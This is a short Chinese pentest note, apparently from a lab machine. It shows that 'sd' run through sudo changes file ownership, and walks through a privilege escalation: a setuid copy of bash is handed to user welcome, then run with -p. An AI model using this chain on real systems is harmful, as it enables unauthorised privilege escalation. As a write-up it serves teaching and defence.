
==**在测试的过程中，发现sd命令执行后会改变源文件的属组，同样的sed命令就不具备这个产生漏洞的特性**==

如图比如我们在渗透过程中已经拿到了系统的初始shell，如果我们能以某个用户的权限来执行sd命令，那么就可以利用sd命令来提升至该用户权限，看如下例子


```
www-data@Scanner:/tmp/test$ echo 123 > test
www-data@Scanner:/tmp/test$ ls -al
total 12
drwxrwxrwx 2 www-data www-data 4096 Nov 13 04:46 .
drwxrwxrwt 3 root     root     4096 Nov 13 04:25 ..
-rw-rw-rw- 1 www-data www-data    4 Nov 13 04:46 test
www-data@Scanner:/tmp/test$ sudo -l
Matching Defaults entries for www-data on Scanner:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User www-data may run the following commands on Scanner:
    (welcome) NOPASSWD: /usr/bin/ln
    (welcome) NOPASSWD: /usr/bin/sd
www-data@Scanner:/tmp/test$ sudo -u welcome sd '' '' test
www-data@Scanner:/tmp/test$ ls -al
total 12
drwxrwxrwx 2 www-data www-data 4096 Nov 13 04:46 .
drwxrwxrwt 3 root     root     4096 Nov 13 04:25 ..
-rw-rw-rw- 1 welcome  welcome     4 Nov 13 04:46 test

```
可以看到文件的属组已经从www-data变成了welcome

所以我们可以通过低权限用户为属组自身的文件加s位，从而结合sd命令改变文件属组，造成漏洞提权


```
www-data@Scanner:/tmp/test$ cp /bin/bash ./bash1
www-data@Scanner:/tmp/test$ ls -al
total 1152
drwxrwxrwx 2 www-data www-data    4096 Nov 13 04:48 .
drwxrwxrwt 3 root     root        4096 Nov 13 04:25 ..
-rwxr-xr-x 1 www-data www-data 1168776 Nov 13 04:48 bash1
www-data@Scanner:/tmp/test$ chmod a+s bash1
www-data@Scanner:/tmp/test$ ls -al
total 1152
drwxrwxrwx 2 www-data www-data    4096 Nov 13 04:48 .
drwxrwxrwt 3 root     root        4096 Nov 13 04:25 ..
-rwsr-sr-x 1 www-data www-data 1168776 Nov 13 04:48 bash1
www-data@Scanner:/tmp/test$ sudo -u welcome sd '' '' bash1
www-data@Scanner:/tmp/test$ ls -al
total 1152
drwxrwxrwx 2 www-data www-data    4096 Nov 13 04:48 .
drwxrwxrwt 3 root     root        4096 Nov 13 04:25 ..
-rwsr-sr-x 1 welcome  welcome  1168776 Nov 13 04:48 bash1
www-data@Scanner:/tmp/test$ ./bash1 -p
bash1-5.0$ id
uid=33(www-data) gid=33(www-data) euid=1000(welcome) egid=1000(welcome) groups=1000(welcome),33(www-data)

```
可以看到目前已经提升到了welcome的权限

同样在先前的测试中，ln命令配合sd命令报错后，可以产生.开头的临时文件，此文件的属组为命令执行时的用户，权限继承源文件权限不变，内容为sd替换后的结果，不过再次测试并没有发现再次产生此种文件，深层的原理目前未知。

